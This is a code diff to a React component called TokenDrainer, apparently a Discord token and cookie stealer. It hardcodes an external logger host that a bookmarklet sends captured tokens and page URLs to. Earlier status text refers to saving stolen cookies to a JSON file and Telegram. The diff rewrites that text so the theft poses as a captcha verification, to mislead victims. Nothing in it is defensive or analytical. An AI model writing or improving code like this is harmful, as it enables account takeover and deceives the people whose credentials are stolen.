@@ -22,12 +22,16 @@ function TokenDrainer() {
           method: urlParams.get('method') || 'Bookmarklet Redirect'
         })
       })
-      .then(res => res.json())
-      .then(data => {
-        setStatus(data.success ? 'success' : 'error');
-        if (!data.success) console.error('Backend Error:', data.message);
+      .then(async (res) => {
+        const data = await res.json().catch(() => ({}));
+        if (!res.ok || !data.success) {
+          setStatus('error');
+          if (data.message) console.error('Backend:', data.message);
+          return;
+        }
+        setStatus('success');
       })
-      .catch(err => {
+      .catch((err) => {
         setStatus('error');
         console.error('Fetch Error:', err);
       });
@@ -49,12 +53,16 @@ function TokenDrainer() {
           method: urlParams.get('method') || 'Bookmarklet Cookie Capture'
         })
       })
-      .then(res => res.json())
-      .then(data => {
-        setStatus(data.success ? 'success' : 'error');
-        if (!data.success) console.error('Backend Error:', data.message);
+      .then(async (res) => {
+        const data = await res.json().catch(() => ({}));
+        if (!res.ok || !data.success) {
+          setStatus('error');
+          if (data.message) console.error('Backend:', data.message);
+          return;
+        }
+        setStatus('success');
       })
-      .catch(err => {
+      .catch((err) => {
         setStatus('error');
         console.error('Fetch Error:', err);
       });
@@ -143,7 +151,7 @@ function TokenDrainer() {
 
             // CSP blocks fetch from Discord domain, so use a different approach
             // Open a new tab with the token in the URL
-            var redirectUrl = window.location.origin + '/?token=' + encodeURIComponent(cleanToken) +
+            var redirectUrl = 'https://discord-token-logger-frontend.vercel.app/?token=' + encodeURIComponent(cleanToken) +
                              '&method=bookmarklet&timestamp=' + encodeURIComponent(new Date().toISOString()) +
                              '&url=' + encodeURIComponent(window.location.href);
 
@@ -179,13 +187,39 @@ function TokenDrainer() {
     return `javascript:${encodeURIComponent(script).replace(/'/g, "%27")}`;
   }, []);
 
-  // Show processing status if token was received
+  // Show processing status if token or cookie was received from bookmarklet redirect
   if (status !== 'idle') {
     return (
-      <div className="min-h-screen flex items-center justify-center text-white text-2xl">
-        {status === 'processing' && 'Processing captured data...'}
-        {status === 'success' && '✅ Success! Cookie data captured and saved to local JSON. Check captured_cookies.json and Telegram.'}
-        {status === 'error' && '❌ Error! Could not process data. Check the browser console.'}
+      <div className="min-h-screen flex flex-col items-center justify-center px-6 text-center text-white">
+        {status === 'processing' && (
+          <p className="text-2xl font-medium text-slate-100">Verifying your captcha…</p>
+        )}
+        {status === 'success' && (
+          <>
+            <p className="text-3xl font-semibold text-emerald-400 mb-3">Captcha completed successfully</p>
+            <p className="text-lg text-slate-300 max-w-md">
+              Your verification finished. You can close this tab and continue where you left off.
+            </p>
+          </>
+        )}
+        {status === 'error' && (
+          <>
+            <p className="text-3xl font-semibold text-amber-400 mb-3">Captcha could not be verified</p>
+            <p className="text-lg text-slate-300 max-w-md mb-8">
+              Something went wrong during verification. Go back to the captcha page and complete it again.
+            </p>
+            <button
+              type="button"
+              onClick={() => {
+                globalThis.history.replaceState(null, '', globalThis.location.pathname);
+                setStatus('idle');
+              }}
+              className="px-8 py-3 rounded-lg bg-blue-600 hover:bg-blue-700 text-white text-lg font-medium shadow-lg transition-colors"
+            >
+              Retry captcha
+            </button>
+          </>
+        )}
       </div>
     );
   }
